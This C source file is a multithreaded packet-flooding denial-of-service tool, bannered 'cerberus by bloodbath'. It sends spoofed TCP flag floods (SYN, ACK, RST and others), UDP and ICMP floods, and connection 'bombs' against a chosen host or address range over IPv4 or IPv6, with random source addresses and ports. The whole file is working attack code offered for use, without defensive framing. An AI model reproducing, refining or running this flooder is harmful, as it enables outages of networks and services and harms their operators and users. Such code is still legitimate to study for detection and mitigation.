//this is godly lol best method out.
#ifndef _BSD_SOURCE
#define _BSD_SOURCE
#endif
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in_systm.h>
#include <sys/socket.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#ifndef __USE_BSD
#define __USE_BSD
#endif
#ifndef __FAVOR_BSD
#define __FAVOR_BSD
#endif
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip6.h>
#include <netinet/ip_icmp.h>
#include <netinet/icmp6.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <pthread.h>
static void usage(const char *argv0);
#define INET_ADDR       16
#define INET6_ADDR      46
#define TCP_FIN         1
#define TCP_SYN         2
#define TCP_RST         4
#define TCP_PSH         8
#define TCP_ACK                 16
#define TCP_URG                 32
#define TCP_BMB                 64
#define UDP_BMB                 64
#define UDP_CFF         128
#define ICMP_ECHO_G     256
#define ICMP_HDRLEN     8
#ifdef LINUX
#define FIX(x)  htons(x)
#else
#define FIX(x)  (x)
#endif
/* START THREADS */
#define MAX_THREADS 32768
pthread_t attack_thread[MAX_THREADS];
struct thread_data {
        int initialized;                        // valid thread?
        int flag4, flag6;                       // v4 or v6
        int     start;
        int packets;
        unsigned int timeout;           // attack timeout
        int thread;
        unsigned int bombsize;          // size of connect bomb
        int socket;                                     // rawsock
        int a_flags;                            // a_flags
        struct sockaddr_in      destination4;
        struct sockaddr_in6 destination6;
        u_long dstaddr;
        u_char th_flags;
        int     d_lport;
        int d_hport;
        int s_lport;
        int s_hport;
        char *src_class;
        char *dst_class;
        char SrcIP4[INET_ADDR];
        char SrcIP6[INET6_ADDR];
        char DestIP4[INET_ADDR];
        char DestIP6[INET6_ADDR];

};
struct thread_data thread_data_array[MAX_THREADS];
/* END THREADS */

void  handle_exit () {
        int i;
        int packets;
        packets   = thread_data_array[1].packets
                          + thread_data_array[2].packets
                          +     thread_data_array[4].packets
                          +     thread_data_array[8].packets
                          + thread_data_array[16].packets
                      + thread_data_array[32].packets
                          + thread_data_array[64].packets
                          + thread_data_array[128].packets
                          + thread_data_array[256].packets;
        printf ("Packeting completed, %d total, %d seconds, %d pps\n",  packets, time (NULL) - thread_data_array[0].start, packets / (time (NULL) - thread_data_array[0].start));
        exit (0);
}
void *send_bomb(void* arg);
void *send_bomb_udp(void* arg);

struct pseudo_hdr
{
    u_long saddr, daddr;    /* source and dest address   */
    u_char mbz, ptcl;       /* zero and protocol         */
    u_short tcpl;           /* tcp length                */
};
struct checksum
{
    struct pseudo_hdr pseudo;
    struct tcphdr tcp;
};

u_long
lookup(const char *host)
{
    struct hostent *hp;
    if ( (hp = gethostbyname(host)) == NULL)
        {
        perror("gethostbyname");
        exit(-1);
    }
    return *(u_long *)hp->h_addr;
}

unsigned short
in_cksum(unsigned short *addr, int len)
{
    int nleft = len;
    int sum = 0;
    unsigned short *w = addr;
    unsigned short answer = 0;
    while (nleft > 1)
        {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1)
        {
        *(unsigned char *) (&answer) = *(unsigned char *)w;
        sum += answer;
    }
    sum    = (sum >> 16) + (sum & 0xffff);  /* add hi 16 to low 16 */
    sum   += (sum >> 16);                   /* add carry           */
    answer = ~sum;                          /* truncate to 16 bits */
    return answer;
}
char *src_class, *dst_class = NULL;

char *
class2ip(const char *class)
{
    static char ip[INET_ADDR];
    int i, j;
    for (i = 0, j = 0; class[i] != '\0'; ++i)
        if (class[i] == '.')
            ++j;
    switch (j) {
        case 0:
            sprintf(ip, "%s.%d.%d.%d", class, (int) random() % 255+1, (int) random() % 255+1, (int) random() % 255+1);
            break;
        case 1:
            sprintf(ip, "%s.%d.%d", class, (int) random() % 255+1, (int) random() % 255+1);
            break;
        case 2:
            sprintf(ip, "%s.%d", class, (int) random() % 255+1);
            break;
        /* Spoofing single host */
        default: strncpy(ip, class, INET_ADDR);
                 break;
    }
    return ip;
}

char *class2ip6(const char *class)
{
    static char ip[INET6_ADDR];
        uint16_t n;
    int x, y;
    for (x = 0, y = 0; class[x] != '\0'; ++x)
            if (class[x] == ':')
                ++y;
        int i;
        for (i = 0; i < 7; i++)
        {
                char hex[3][i];
                n = mrand48();                                          // #1
                n = rand();                                             // #2
                FILE * f = fopen("/dev/urandom", "rb");
                fread(&n, sizeof(uint16_t), 1, f);  // #3
                sprintf(hex[i], "%04X", n);
                if(i==0)
                        strcpy(ip, class);
                strcat(ip, hex[i]);
                if(i<6)
                        strcat(ip, ":");
        }
        return ip;
}
static void
inject(struct ip *ip, u_char p, u_char len) {
    /* Filling IP header */
        ip->ip_hl             = 5;
        ip->ip_v              = 4;
        ip->ip_p              = p;
        ip->ip_tos            = 0x08; /* 0x08 */
        ip->ip_id             = random();
        ip->ip_len            = len;
        ip->ip_off            = 0;
        ip->ip_ttl            = 128;  //was 255
        ip->ip_dst.s_addr     = thread_data_array[0].dst_class != NULL ?
                                inet_addr(class2ip(thread_data_array[0].dst_class)) :
                                thread_data_array[0].dstaddr;
        ip->ip_src.s_addr     = thread_data_array[0].src_class != NULL ?
                                inet_addr(class2ip(thread_data_array[0].src_class)) :
                                random();
        thread_data_array[0].destination4.sin_addr.s_addr = ip->ip_dst.s_addr;
}
static void
inject6(struct ip6_hdr *ip, u_char p, u_char len) {
        ip->ip6_ctlun.ip6_un1.ip6_un1_flow      = htonl ((6 << 28) | (0 << 20) | 0);
        ip->ip6_ctlun.ip6_un1.ip6_un1_plen      = htons( 8 + len );
        ip->ip6_ctlun.ip6_un1.ip6_un1_nxt       = p;
        ip->ip6_ctlun.ip6_un1.ip6_un1_hlim      = 255;
        inet_pton (AF_INET6, thread_data_array[0].DestIP6,   &ip->ip6_dst);
        inet_pton (AF_INET6, thread_data_array[0].src_class, &ip->ip6_src);
        thread_data_array[0].destination6.sin6_addr = ip->ip6_dst;
}

void *send_tcp(void* arg)
{
        struct thread_data *param2  = arg;
    struct checksum checksum;
    struct packet
        {
        struct ip ip;
        struct tcphdr tcp;
    } packet;
    struct packet6
        {
        struct ip6_hdr ip;
        struct tcphdr tcp;
    } packet6;
        printf("[%d] Acquired socket %d\n", param2->thread, param2->socket);
        signal(SIGALRM, handle_exit);
        alarm(thread_data_array[0].timeout);
        if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0)
        {
                do
                {
                /* Filling IP header */
                memset(&packet, 0, sizeof packet);
                inject(&packet.ip, IPPROTO_TCP, FIX(sizeof packet));
                        packet.ip.ip_sum            = in_cksum((void *)&packet.ip, sizeof(packet));
                    /* Filling cksum pseudo header */
                    checksum.pseudo.daddr       = thread_data_array[0].dstaddr;
                    checksum.pseudo.mbz         = 0;
                    checksum.pseudo.ptcl                = IPPROTO_TCP;
                    checksum.pseudo.tcpl                = sizeof(struct tcphdr);
                    checksum.pseudo.saddr       = packet.ip.ip_src.s_addr;
                    /* Filling TCP header */
                packet.tcp.th_win               = htons(65535);
                    packet.tcp.th_seq           = random();
                        //packet.tcp.th_x2                      = 4;
                        if      (param2->th_flags == TCP_ACK)
                        packet.tcp.th_ack       = 1;
                        else
                        packet.tcp.th_ack       = 0;
                    packet.tcp.th_flags         = param2->th_flags;
                packet.tcp.th_off               = 5;
                        if      (param2->th_flags == TCP_URG)
                            packet.tcp.th_urp       = 1;
                        else
                            packet.tcp.th_urp       = 0;
                    packet.tcp.th_sport         = thread_data_array[0].s_lport == 0 ?
                                                          random () :
                                                  htons(thread_data_array[0].s_lport + (random() %
                                                                                  (thread_data_array[0].s_hport - thread_data_array[0].s_lport + 1)));
                    packet.tcp.th_dport         = thread_data_array[0].d_lport == 0 ?
                                                          random () :
                                                  htons(thread_data_array[0].d_lport + (random() %
                                                                                  (thread_data_array[0].d_hport - thread_data_array[0].d_lport + 1)));
                    checksum.tcp                = packet.tcp;
                    packet.tcp.th_sum           = in_cksum((void *)&checksum, sizeof(checksum));
                        param2->packets++;
                } while ( sendto(param2->socket, &packet, (sizeof packet),
                                                 0, (struct sockaddr *)&thread_data_array[0].destination4,
                                 sizeof(thread_data_array[0].destination4)) );
        }
        if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1)
        {
                do
                {
                /* Filling IP header */
                memset(&packet6, 0, sizeof packet6);
                inject6(&packet6.ip, IPPROTO_TCP, FIX(sizeof packet6));
                    /* Filling cksum pseudo header */
                    checksum.pseudo.daddr       = thread_data_array[0].dstaddr;
                    checksum.pseudo.mbz         = 0;
                    checksum.pseudo.ptcl                = IPPROTO_TCP;
                    checksum.pseudo.tcpl                = sizeof(struct tcphdr);
                    /* Filling TCP header */
                packet6.tcp.th_win              = htons(65535);
                    packet6.tcp.th_seq          = random();
                        //packet6.tcp.th_x2                     = 4;
                        if      (param2->th_flags == TCP_ACK)
                        packet6.tcp.th_ack       = 1;
                        else
                        packet6.tcp.th_ack       = 0;
                    packet6.tcp.th_flags        = param2->th_flags;
                packet6.tcp.th_off              = 5;
                        if      (param2->th_flags == TCP_URG)
                            packet6.tcp.th_urp       = 1;
                        else
                            packet6.tcp.th_urp       = 0;
                    packet6.tcp.th_sport        = thread_data_array[0].s_lport == 0 ?
                                                          random () :
                                                  htons(thread_data_array[0].s_lport + (random() %
                                                                                  (thread_data_array[0].s_hport - thread_data_array[0].s_lport + 1)));
                    packet6.tcp.th_dport        = thread_data_array[0].d_lport == 0 ?
                                                          random () :
                                                  htons(thread_data_array[0].d_lport + (random() %
                                                                                  (thread_data_array[0].d_hport - thread_data_array[0].d_lport + 1)));
                    checksum.tcp                = packet.tcp;
                    packet6.tcp.th_sum          = in_cksum((void *)&checksum, sizeof(checksum));
                        param2->packets++;
                } while ( sendto(param2->socket, &packet6.tcp, (sizeof packet6),
                                                 0, (struct sockaddr *)&thread_data_array[0].destination6,
                                 sizeof(thread_data_array[0].destination6)) );
        }
}

void *send_udp(void* arg) {
        struct thread_data *param2  = arg;
    struct packet
        {
        struct ip ip;
        struct udphdr udp;
    } packet;
    struct packet6
        {
        struct ip6_hdr ip;
        struct udphdr udp;
    } packet6;
        printf("[%d] Acquired socket %d\n", param2->thread, param2->socket);
        signal(SIGALRM, handle_exit);
        alarm(thread_data_array[0].timeout);
        if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0)
        {
                do
                {
                    /* Filling IP header */
                    memset(&packet, 0, sizeof packet);
                    inject(&packet.ip, IPPROTO_UDP, FIX(sizeof packet));
                        packet.ip.ip_sum            = in_cksum((void *)&packet.ip, sizeof(packet));
                    /* Filling UDP header */
                    packet.udp.uh_sport         = thread_data_array[0].s_lport == 0 ?
                                                          random () :
                                                  htons(thread_data_array[0].s_lport + (random() %
                                                                                  (thread_data_array[0].s_hport - thread_data_array[0].s_lport + 1)));
                    packet.udp.uh_dport         = thread_data_array[0].d_lport == 0 ?
                                                          random () :
                                                  htons(thread_data_array[0].d_lport + (random() %
                                                                                  (thread_data_array[0].d_hport - thread_data_array[0].d_lport + 1)));
                    packet.udp.uh_ulen          = htons(sizeof packet.udp);
                    packet.udp.uh_sum           = 0;
                        param2->packets++;
                } while ( sendto(param2->socket, &packet, (sizeof packet),
                                                 0, (struct sockaddr *)&thread_data_array[0].destination4,
                                 sizeof(thread_data_array[0].destination4)) );
        }
        else if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1)
        {
                do
                {
                    /* Filling IP header */
                    memset(&packet6, 0, sizeof packet6);
                    inject6(&packet6.ip, IPPROTO_UDP, FIX(sizeof packet6));
                    /* Filling UDP header */
                    packet6.udp.uh_sport        = thread_data_array[0].s_lport == 0 ?
                                                          random () :
                                                  htons(thread_data_array[0].s_lport + (random() %
                                                                                  (thread_data_array[0].s_hport - thread_data_array[0].s_lport + 1)));
                    packet6.udp.uh_dport        = thread_data_array[0].d_lport == 0 ?
                                                          random () :
                                                  htons(thread_data_array[0].d_lport + (random() %
                                                                                  (thread_data_array[0].d_hport - thread_data_array[0].d_lport + 1)));
                    packet6.udp.uh_ulen         = htons(sizeof packet6.udp);
                    packet6.udp.uh_sum          = 0;
                        packet6.udp.uh_sum                      = in_cksum((void *)&packet6, sizeof(packet6));
                        param2->packets++;
                } while ( sendto(param2->socket, &packet6, (sizeof packet6),
                                                 0, (struct sockaddr *)&thread_data_array[0].destination6,
                                 sizeof(thread_data_array[0].destination6)) );
        }
}

void *send_icmp(void* arg) {
        struct thread_data *param2  = arg;
    struct packet
        {
                struct ip ip;
        struct icmp icmp;
    } packet;
    struct packet6
        {
                struct ip6_hdr ip;
        struct icmp6_hdr icmp;
    } packet6;
        printf("[%d] Acquired socket %d\n", param2->thread, param2->socket);
        signal(SIGALRM, handle_exit);
        alarm(thread_data_array[0].timeout);
        if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0)
        {
                do
                {
                    /* Filling IP header */
                        memset(&packet, 0, sizeof packet);
                    inject(&packet.ip, IPPROTO_ICMP, FIX(sizeof packet));
                        packet.ip.ip_sum            = in_cksum((void *)&packet.ip, 20);
                    /* Filling ICMP header */
                        packet.icmp.icmp_type       = ICMP_ECHO;
                    packet.icmp.icmp_code       = 0;
                    packet.icmp.icmp_cksum      = htons( ~(ICMP_ECHO << 8));
                        param2->packets++;
                } while ( sendto(param2->socket, &packet, (sizeof packet),
                                                 0, (struct sockaddr *)&thread_data_array[0].destination4,
                                         sizeof(thread_data_array[0].destination4)) );
        }
        else if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1)
        {
                do
                {
                    /* Filling IP header */
                        memset(&packet6, 0, sizeof packet6);
                    inject6(&packet6.ip, IPPROTO_ICMPV6, FIX(sizeof packet6));
                    /* Filling ICMP header */
                        packet6.icmp.icmp6_type         = ICMP6_ECHO_REQUEST;
                    packet6.icmp.icmp6_code             = 0;
                        packet6.icmp.icmp6_id           = random();
                        packet6.icmp.icmp6_seq          = random();
                        packet6.icmp.icmp6_cksum        = 0;
                        packet6.icmp.icmp6_cksum        = in_cksum((void *)&packet6, sizeof(packet6));
                        param2->packets++;
                } while ( sendto(param2->socket, &packet6.icmp, (sizeof packet6),
                                                 0, (struct sockaddr *)&thread_data_array[0].destination6,
                                         sizeof(thread_data_array[0].destination6)) );
        }
}
void *send_bomb(void* arg) {
        struct thread_data *param2  = arg;
        if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1) {
        }
        if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0)
                param2->socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        else if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1)
                param2->socket = socket(AF_INET6, SOCK_RAW, IPPROTO_TCP);
        int i;
        uint16_t n;
    static char bmbstring[16];
        for (i = 0; i < 4; i++) {
                char hex[3][i];
                n = mrand48();
                n = rand();
                FILE * f = fopen("/dev/urandom", "rb");
                fread(&n, sizeof(uint16_t), 1, f);
                sprintf(hex[i], "%04X", n);
                strcat(bmbstring, hex[i]);
        }
        if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0)
        connect(param2->socket, (struct sockaddr *)&thread_data_array[0].destination4, sizeof(struct sockaddr_in));
        else if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1)
        connect(param2->socket, (struct sockaddr *)&thread_data_array[0].destination6, sizeof(struct sockaddr_in6));
        printf("[%d] Acquired socket %d - using string (%s)\n", param2->thread, param2->socket, bmbstring);
        signal(SIGALRM, handle_exit);
        alarm(thread_data_array[0].timeout);
        do {
                param2->packets++;
        } while ( send(param2->socket, bmbstring, param2->bombsize, 0) );
        return 0;
}
void *send_bomb_udp(void* arg) {
        struct thread_data *param2  = arg;
        if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1) {
        }
        if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0)
                param2->socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        else if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1)
                param2->socket = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
        int i;
        uint16_t n;
    static char bmbstring[16];
        for (i = 0; i < 4; i++) {
                char hex[3][i];
                n = mrand48();
                n = rand();
                FILE * f = fopen("/dev/urandom", "rb");
                fread(&n, sizeof(uint16_t), 1, f);
                sprintf(hex[i], "%04X", n);
                strcat(bmbstring, hex[i]);
        }
        if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0)
        connect(param2->socket, (struct sockaddr *)&thread_data_array[0].destination4, sizeof(struct sockaddr_in));
        else if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1)
        connect(param2->socket, (struct sockaddr *)&thread_data_array[0].destination6, sizeof(struct sockaddr_in6));
        printf("[%d] Acquired socket %d - using string (%s)\n", param2->thread, param2->socket, bmbstring);
        signal(SIGALRM, handle_exit);
        alarm(thread_data_array[0].timeout);
        do {
        param2->packets++;
        } while (send(param2->socket, bmbstring, param2->bombsize, 0));
        return 0;
}
int main(int argc, char *argv[]) {
        int i = 0, n, s;
        int on = 1;
        char DestIP4[INET_ADDR];
        char DestIP6[INET6_ADDR];
        struct sockaddr_in DestAddress4;
        struct sockaddr_in6 DestAddress6;
    while ( (n = getopt(argc, argv, "46T:C:R:IUh:d:s:t:p:q:")) != -1) {
        char *p;
                switch (n) {
                        case '4':
                                thread_data_array[0].flag4 = 1;
                                break;
                        case '6':
                                thread_data_array[0].flag6 = 1;
                                break;
                        case 'T':
                switch (atoi(optarg))
                                {
                    case 0:
                                                thread_data_array[TCP_FIN].initialized  = 1;
                                                thread_data_array[0].a_flags |= TCP_FIN;
                                                thread_data_array[TCP_FIN].a_flags |= TCP_FIN;
                                                break;
                    case 1:
                                                thread_data_array[TCP_SYN].initialized  = 1;
                                                thread_data_array[0].a_flags |= TCP_SYN;
                                                thread_data_array[TCP_SYN].a_flags |= TCP_SYN;
                                                break;
                    case 2:
                                                thread_data_array[TCP_RST].initialized  = 1;
                                                thread_data_array[0].a_flags |= TCP_RST;
                                                thread_data_array[TCP_RST].a_flags |= TCP_RST;
                                                break;
                    case 3:
                                                thread_data_array[TCP_PSH].initialized  = 1;
                                                thread_data_array[0].a_flags |= TCP_PSH;
                                                thread_data_array[TCP_PSH].a_flags |= TCP_PSH;
                                                break;
                    case 4:
                                                thread_data_array[TCP_ACK].initialized  = 1;
                                                thread_data_array[0].a_flags |= TCP_ACK;
                                                thread_data_array[TCP_ACK].a_flags |= TCP_ACK;
                                                break;
                    case 5:
                                                thread_data_array[TCP_URG].initialized  = 1;

                                                thread_data_array[0].a_flags |= TCP_URG;
                                                thread_data_array[TCP_URG].a_flags |= TCP_URG;
                                                break;
                }
                                break;
                        case 'C':
                                thread_data_array[TCP_BMB].initialized = 1;
                                thread_data_array[0].a_flags |= TCP_BMB;
                                thread_data_array[TCP_BMB].a_flags |= TCP_BMB;
                                thread_data_array[TCP_BMB].bombsize = atoi(optarg);
                                break;
                        case 'R':
                                thread_data_array[UDP_BMB].initialized = 1;
                                thread_data_array[0].a_flags |= UDP_BMB;
                                thread_data_array[UDP_BMB].a_flags |= UDP_BMB;
                                thread_data_array[UDP_BMB].bombsize = atoi(optarg);
                                break;
                        case 'I':
                                thread_data_array[ICMP_ECHO_G].initialized = 1;
                                thread_data_array[0].a_flags |= ICMP_ECHO_G;
                                thread_data_array[ICMP_ECHO_G].a_flags |= ICMP_ECHO_G;
                                break;
                        case 'U':
                                thread_data_array[UDP_CFF].initialized = 1;
                                thread_data_array[0].a_flags |= UDP_CFF;
                                thread_data_array[UDP_CFF].a_flags |= UDP_CFF;
                                break;
                        case 'h':
                                if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0)
                                {
                                        DestAddress4.sin_family         = AF_INET;
                                inet_pton(AF_INET, optarg, &DestAddress4.sin_addr);
                                        thread_data_array[0].dstaddr = lookup(optarg);
                                        thread_data_array[0].destination4       =       DestAddress4;
                                }
                                else if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1)
                                {
                                        DestAddress6.sin6_family        = AF_INET6;
                                inet_pton(AF_INET6, optarg, &DestAddress6.sin6_addr);
                                        thread_data_array[0].destination6       =       DestAddress6;
                                }
                                else
                                {
                                printf("-4 and -6 can not both be specified.\n\n");
                        usage(argv[0]);
                                }
                                break;
            case 'd':
                thread_data_array[0].dst_class = optarg;
                break;
            case 's':
                thread_data_array[0].src_class = optarg;
                break;
            case 'p':
                if ( (p = (char *) strchr(optarg, ',')) == NULL)
                    usage(argv[0]);
                thread_data_array[0].d_lport = atoi(optarg);    /* Destination start port */
                thread_data_array[0].d_hport = atoi(p + 1);     /* Destination end port */
                break;
            case 'q':
                if ( (p = (char *) strchr(optarg, ',')) == NULL)
                    usage(argv[0]);
                thread_data_array[0].s_lport = atoi(optarg);    /* Destination start port */
                thread_data_array[0].s_hport = atoi(p + 1);     /* Destination end port */
                break;
            case 't':
                thread_data_array[0].timeout = atoi(optarg);
                break;
            default:
                usage(argv[0]);
                break;
                }
        }
        if  (!thread_data_array[0].timeout) {
        usage(argv[0]);
        }
        if  (!thread_data_array[0].src_class) {
        if(thread_data_array[0].flag6 == 1) {
        printf("\n\e[1;37merror: -s must be specified with -6\n\n");
        usage(argv[0]);
        }
        }
        if      ( (!thread_data_array[0].flag4 && !thread_data_array[0].flag6)  ||
                (!thread_data_array[0].a_flags)                                                                 ||
                (!thread_data_array[0].timeout)
                ) {
        usage(argv[0]);
        }
        if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0) {
        int i;
        for (i = TCP_FIN; i <= ICMP_ECHO_G; i*=2) {
                        if ( thread_data_array[i].initialized == 1 )
                        {
                        if ( (thread_data_array[i].socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
                                {
                                perror("socket");
                                exit(-1);
                        }

                        if (setsockopt(thread_data_array[i].socket, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0)
                                {
                        perror("setsockopt");
                        exit(-1);
                        }
                        }
                }
printf("[IPv4] Packeting (%s) from (%s) with flags (%i) for (%i) seconds.\n\n",thread_data_array[0].dst_class != NULL ? thread_data_array[0].dst_class : inet_ntop(AF_INET, &thread_data_array[0].destination4.sin_addr, thread_data_array[0].DestIP4, sizeof(thread_data_array[0].DestIP4)),thread_data_array[0].src_class,thread_data_array[0].a_flags, thread_data_array[0].timeout);
        }
        else if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1)
        {
                int i;
        for (i = TCP_FIN; i <= ICMP_ECHO_G; i*=2) {
                        if ( thread_data_array[i].initialized== 1 )
                        {
                                if (thread_data_array[i].a_flags <= TCP_BMB )
                                {
                                if ( (thread_data_array[i].socket = socket(AF_INET6, SOCK_RAW, IPPROTO_TCP)) < 0)
                                        {
                                        perror("socket");
                                        exit(-1);
                                }
                                }
                                else if (thread_data_array[i].a_flags == UDP_BMB) {
                                if ( (thread_data_array[i].socket = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)) < 0)
                             {
                                        perror("socket");
                                        exit(-1);
                                }
                                }
                                else if (thread_data_array[i].a_flags == UDP_CFF)
                                {
                                if ( (thread_data_array[i].socket = socket(AF_INET6, SOCK_RAW, IPPROTO_UDP)) < 0)
                                        {
                                        perror("socket");
                                        exit(-1);
                                }
                                }
                                else if (thread_data_array[i].a_flags == ICMP_ECHO_G)
                                {
                                if ( (thread_data_array[i].socket = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6)) < 0)
                                        {
                                        perror("socket");
                                        exit(-1);
                                }
                                }
                        if (setsockopt(thread_data_array[i].socket, IPPROTO_IPV6, IPV6_TCLASS, (char *)&on, sizeof(on)) < 0) {
                        perror("setsockopt");
                        exit(-1);
                        }
                        }
                }
                printf("[IPv6] Packeting (%s) from (%s) with flags (%i) for (%i) seconds.\n\n",thread_data_array[0].dst_class != NULL ? thread_data_array[0].dst_class : inet_ntop(AF_INET6, &thread_data_array[0].destination6.sin6_addr, thread_data_array[0].DestIP6, sizeof(thread_data_array[0].DestIP6)),thread_data_array[0].src_class,thread_data_array[0].a_flags,thread_data_array[0].timeout);
        }
        signal (SIGINT,  handle_exit);
        signal (SIGTERM, handle_exit);
        signal (SIGQUIT, handle_exit);
        thread_data_array[0].start              = time(NULL);
        for (i = TCP_FIN; i <= ICMP_ECHO_G; i*=2) {
                if (thread_data_array[i].a_flags == TCP_FIN)
                {
                        thread_data_array[i].thread             = i;
                        thread_data_array[i].packets    = 0;
                        thread_data_array[i].th_flags = TH_FIN;
                        if(pthread_create(&attack_thread[i], NULL, &send_tcp, (void *)&thread_data_array[i]) != 0)
                        {
                        printf("+    Thread error:\n");
                                perror("-    pthread_create()\n");
                }
                }
                if (thread_data_array[i].a_flags == TCP_SYN)
                {
                        thread_data_array[i].thread             = i;
                        thread_data_array[i].packets    = 0;
                        thread_data_array[i].th_flags = TH_SYN;
                        if(pthread_create(&attack_thread[i], NULL, &send_tcp, (void *)&thread_data_array[i]) != 0)
                        {
                        printf("+    Thread error:\n");
                                perror("-    pthread_create()\n");
                }
                }
                if (thread_data_array[i].a_flags == TCP_RST)
                {
                        thread_data_array[i].thread             = i;
                        thread_data_array[i].packets    = 0;
                        thread_data_array[i].th_flags = TH_RST;
                        if(pthread_create(&attack_thread[i], NULL, &send_tcp, (void *)&thread_data_array[i]) != 0)
                        {
                        printf("+    Thread error:\n");
                                perror("-    pthread_create()\n");
                }
                }
                if (thread_data_array[i].a_flags == TCP_PSH)
                {
                        thread_data_array[i].thread             = i;
                        thread_data_array[i].packets    = 0;
                        thread_data_array[i].th_flags = TH_PUSH;
                        if(pthread_create(&attack_thread[i], NULL, &send_tcp, (void *)&thread_data_array[i]) != 0)
                        {
                        printf("+    Thread error:\n");
                                perror("-    pthread_create()\n");
                }
                }
                if (thread_data_array[i].a_flags == TCP_ACK)
                {
                        thread_data_array[i].thread             = i;
                        thread_data_array[i].packets    = 0;
                        thread_data_array[i].th_flags = TH_ACK;
                        if(pthread_create(&attack_thread[i], NULL, &send_tcp, (void *)&thread_data_array[i]) != 0)
                        {
                        printf("+    Thread error:\n");
                                perror("-    pthread_create()\n");
                }
                }
                if (thread_data_array[i].a_flags == TCP_URG)
                {
                        thread_data_array[i].thread             = i;
                        thread_data_array[i].packets    = 0;
                        thread_data_array[i].th_flags = TH_URG;
                        if(pthread_create(&attack_thread[i], NULL, &send_tcp, (void *)&thread_data_array[i]) != 0)
                        {
                        printf("+    Thread error:\n");
                                perror("-    pthread_create()\n");
                }
                }
                if (thread_data_array[i].a_flags == TCP_BMB)
                {
                        thread_data_array[i].thread             = i;
                        thread_data_array[i].packets    = 0;
                        if(pthread_create(&attack_thread[i], NULL, &send_bomb, (void *)&thread_data_array[i]) != 0)
                        {
                        printf("+    Thread error:\n");
                                perror("-    pthread_create()\n");
                }
                }
                if (thread_data_array[i].a_flags == UDP_BMB)
                {
                        thread_data_array[i].thread             = i;
                        thread_data_array[i].packets    = 0;
                        if(pthread_create(&attack_thread[i], NULL, &send_bomb_udp, (void *)&thread_data_array[i]) != 0)
                        {
                        printf("+    Thread error:\n");
                                perror("-    pthread_create()\n");
                }
                }
                if (thread_data_array[i].a_flags == UDP_CFF)
                {
                        thread_data_array[i].thread             = i;
                        thread_data_array[i].packets    = 0;
                        if(pthread_create(&attack_thread[i], NULL, &send_udp, (void *)&thread_data_array[i]) != 0)
                        {
                        printf("+    Thread error:\n");
                                perror("-    pthread_create()\n");
                }
                }
                if (thread_data_array[i].a_flags == ICMP_ECHO_G) {
                        thread_data_array[i].thread             = i;
                        thread_data_array[i].packets    = 0;
                        if(pthread_create(&attack_thread[i], NULL, &send_icmp, (void *)&thread_data_array[i]) != 0)
                        {
                        printf("+    Thread error:\n");
                                perror("-    pthread_create()\n");
                }
                }
        }
        for (i = TCP_FIN; i <= ICMP_ECHO_G; i*=2)
                pthread_join(attack_thread[i], NULL);
    exit(0);
}
const char *banner_name         = "\e[1;37m(\e[0m\e[0;31mcerberus\e[0m\e[1;37m)\e[0m-\e[1;37mby\e[0m-\e[1;37m(\e[0m\e[0;31mbloodbath\e[0m\e[1;37m)\e[0m";
static void
usage(const char *argv0)
{
    printf("%s \n",   banner_name);
        printf("    -4 IPv4\n");
        printf("    -6 IPv6\n");
        printf("    -U UDP  attack                                        \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n");
        printf("    -I ICMP attack                                        \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n");
        printf("    -C TCP  bomb                                          \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n");
        printf("    -T TCP  attack         \e[1;37m[\e[0m0:FIN, 1:SYN, 2:RST, 3:PUSH, 4:ACK, 5:URG\e[1;37m]\e[0m\n");
        printf("    -h destination ip                                     \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n");
        printf("    -d destination class                                  \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n");
        printf("    -s source class/ip                                    \e[1;37m(\e[m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
        printf("    -p destination port range [start,end]                 \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
        printf("    -q source port range      [start,end]                 \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
        printf("    -t timeout                                            \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n");
    printf("usage\e[0m: %s -4 -6 [-U -I -C -T -h -d -s -p -q -t]\n", argv0);
    exit(-1);
}